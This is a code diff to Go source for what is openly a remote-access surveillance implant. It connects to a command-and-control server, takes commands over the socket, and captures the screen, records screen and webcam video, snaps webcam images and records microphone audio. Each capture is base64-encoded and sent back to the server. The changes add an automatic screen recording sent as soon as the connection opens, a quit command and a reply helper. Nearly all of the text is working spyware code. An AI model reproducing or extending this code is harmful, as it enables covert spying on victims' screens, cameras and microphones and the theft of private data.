@@ -87,6 +87,7 @@ func reach_command_and_control() {
 			reach_command_and_control()
 		} else {
 			// communication with C2
+			conn.Write([]byte(video_recording(0, 5)))
 			engage_via(conn)
 		}
 	} else {
@@ -99,25 +100,37 @@ func engage_via(conn net.Conn) {
 	// continually receive commands from c2 and act on them
 
 	for {
-		var cmd, result string
+		var msg, cmd, result string
+		msg, _ = bufio.NewReader(conn).ReadString('\n')
+		cmd = strings.TrimSpace(string(msg))
 		conn.Read([]byte(cmd))
-
-		if cmd == "capture_screen" {
+		if cmd == "q" || cmd == "quit" {
+			result = "Closing connection"
+			send_resp(conn, result)
+		} else if cmd == "capture_screen" {
 			result = screen_capture()
-			conn.Write([]byte(result))
+			send_resp(conn, result)
 		} else if cmd == "record_screen" {
 			result = video_recording(0, 5)
-			conn.Write([]byte(result))
+			send_resp(conn, result)
 		} else if cmd == "capture_webcam" {
 			result = webcam_snap()
-			conn.Write([]byte(result))
+			send_resp(conn, result)
 		} else if cmd == "record_webcam" {
 			result = video_recording(1, 5)
-			conn.Write([]byte(result))
+			send_resp(conn, result)
 		} else if cmd == "record_audio" {
 			result = mic_record(30)
-			conn.Write([]byte(result))
+			send_resp(conn, result)
 		}
+	}
+}
+
+func send_resp(conn net.Conn, resp string) {
+	if resp == "Closing connection" {
+		fmt.Fprintf(conn, "%s", resp)
+	} else {
+		fmt.Fprintf(conn, "%s# ", resp)
 	}
 }
 
@@ -133,7 +146,6 @@ func screen_capture() string {
 	f, _ := os.Create(file)
 	png.Encode(f, img)
 	result := b64_file(file)
-	os.Remove(file)
 
 	return result
 }
@@ -170,7 +182,7 @@ func webcam_snap() string {
 }
 
 func video_recording(tgt int, t int) string {
-	file := "screen.avi"
+	file := "/tmp/screen.avi"
 	var capture *gocv.VideoCapture
 	var width, height int
 
@@ -190,18 +202,8 @@ func video_recording(tgt int, t int) string {
 		} else {
 			return err
 		}
-		if webcam, err := gocv.VideoCaptureDevice(0); err != nil {
-			return "[!] Webcam not found"
-		} else {
-			if !webcam.IsOpened() {
-				return "[!] Failed to open webcam"
-			}
-			capture = webcam
-			width, height = 640, 480
-		}
 	}
 
-	capture, _ = gocv.OpenVideoCapture(0)
 	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
 	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
 	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)
@@ -217,7 +219,6 @@ func video_recording(tgt int, t int) string {
 	capture.Close()
 	result := b64_file(file) 
 	os.Remove(file)
-
 	return result
 }
 
@@ -227,7 +228,6 @@ func mic_record(t int) string {
 	f, _ := os.Create(file)
 
 	portaudio.Initialize()
-	time.Sleep(1)
 	defer portaudio.Terminate()
 	in := make([]int16, 64)
 	stream, _ := portaudio.OpenDefaultStream(1, 0, 16000, len(in), in)
@@ -245,9 +245,4 @@ func mic_record(t int) string {
 	os.Remove(file)
 
 	return result
-}
-
-func stream_webcam() string {
-	// setup a server to stream from webcam and return the url
-	return ""
 }
